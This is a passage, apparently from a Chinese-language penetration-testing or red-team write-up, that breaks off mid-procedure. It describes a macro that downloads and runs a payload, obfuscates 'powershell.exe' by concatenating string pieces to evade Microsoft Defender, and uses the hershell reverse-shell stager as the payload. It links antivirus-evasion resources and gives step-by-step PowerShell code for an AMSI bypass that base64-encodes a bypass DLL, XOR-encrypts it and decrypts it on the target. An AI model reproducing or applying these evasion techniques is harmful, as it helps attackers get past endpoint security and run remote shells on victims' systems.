宏来下载执行payload。  
稍微改一下绕过Defender：
    "po" & "w" & "er" & "s" & "he" & "l" & "l" & ".e" & "x" & "e" & " "
我们使用[hershell](https://github.com/lesnuages/hershell)作为payload,这是用Go写的轻量级Stage，X86架构当时是无法察觉的，payload生成以后，下面就是混淆和加密，如果使用dsplit之类的东西知道目标环境，也可以手动绕过AV签名。以下是一些资源：
    https://resources.infosecinstitute.com/antivirus-evasion-tools/
    https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1
    http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html
msf5最近也增加了两个免杀模块。
## AMSI绕过
要执行我们的powershell代码，就得绕过微软亲儿子。WD。WD可以防恶意软件的接口，powershell在执行前会向扫描引擎提交内容，然后分析。幸好[cyberark](https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/)之前研究过关于这东西的免杀，被微软标记为使用XOR绕过免杀。
    1. Re-compile the AMSI Bypass DLL
    2. Convert the binary to base64
        $base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$pwd\\bypass.dll"))
    3. XOR encrypt
        foreach($byte in [Text.Encoding]::UTF8.GetBytes($base64string)) { $encrypted += $byte -bxor 1 }
    4. Print encrypted buf as a byte array
        foreach($byte in $encrypted){ Write-Host -nonewline "$byte," }
    On Target
    1. Split encrypted buf due to powershell line limit lengths
    2. Concat the buf
        $xorencrypted = $a + $b + $c + $d + $e + $f + $g
    3. Decrypt the buf 
        foreach($byte in $xorencrypted){$decrypted += $byte -bxor 1 }
    4. Get buf as base64